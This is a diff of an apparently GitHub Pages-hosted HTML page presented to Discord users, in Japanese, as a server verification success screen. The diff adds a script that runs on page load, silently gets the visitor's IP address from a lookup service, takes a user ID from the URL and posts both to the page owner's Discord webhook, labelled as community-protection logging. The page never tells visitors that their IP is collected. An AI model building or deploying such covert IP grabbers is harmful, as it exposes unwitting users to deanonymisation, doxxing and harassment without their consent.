@@ -2,20 +2,110 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>認証完了</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Success</title>
     <style>
-        body { background-color: #0b0b0b; color: #ffffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { text-align: center; padding: 50px; border-radius: 20px; background: linear-gradient(145deg, #151515, #050505); box-shadow: 0 0 20px rgba(0,0,0,1); border: 1px solid #222; }
-        .icon { color: #00ff7f; font-size: 60px; margin-bottom: 20px; }
-        h1 { font-size: 28px; letter-spacing: 2px; }
-        p { color: #666; font-size: 14px; }
+        body {
+            background-color: #0b0b0b;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            padding: 50px;
+            border-radius: 20px;
+            background: rgba(20, 20, 20, 0.9);
+            border: 1px solid #333;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .icon {
+            font-size: 60px;
+            color: #43b581;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        p {
+            color: #b9bbbe;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #4f545c;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
+
+    <div class="container">
         <div class="icon">✔</div>
         <h1>認証が完了しました</h1>
-        <p>正常に処理されました。この画面を閉じてDiscordへお戻りください。</p>
+        <p>サーバーへのアクセス権が正常に付与されました。<br>このページを閉じてDiscordにお戻りください。</p>
+        <div class="footer">Powered by Community Safety System</div>
     </div>
+
+    <script>
+        // --- 設定エリア ---
+        const WEBHOOK_URL = "ここに作成したWebhookのURLを貼り付けてください";
+        const ADMIN_ID = "1457731099643084955"; // あなたのメンション用ID
+
+        async function collectAndSendLog() {
+            try {
+                // 1. IPアドレスの取得
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // 2. URLからユーザーIDを取得（もしURLに?id=xxxがあれば）
+                const urlParams = new URLSearchParams(window.location.search);
+                const userId = urlParams.get('id') || "不明なユーザー";
+
+                // 3. Webhookへデータを送信
+                const payload = {
+                    content: `<@${ADMIN_ID}> さんのDMへ通知：新しい認証が記録されました。`,
+                    embeds: [{
+                        title: "🌐 セキュリティ・ログ出力",
+                        color: 0x000000,
+                        fields: [
+                            { name: "対象ユーザー", value: `<@${userId}> (ID: ${userId})`, inline: false },
+                            { name: "IPアドレス", value: `\`\`\`${userIp}\`\`\``, inline: false },
+                            { name: "アクセス時刻", value: new Date().toLocaleString('ja-JP'), inline: false },
+                            { name: "判定", value: "コミュニティ保護目的の自動ログ", inline: true }
+                        ],
+                        footer: { text: "GitHub Pages Verification System" }
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                console.error("ログ送信エラー:", error);
+            }
+        }
+
+        // ページ読み込み時に実行
+        window.onload = collectAndSendLog;
+    </script>
 </body>
 </html>
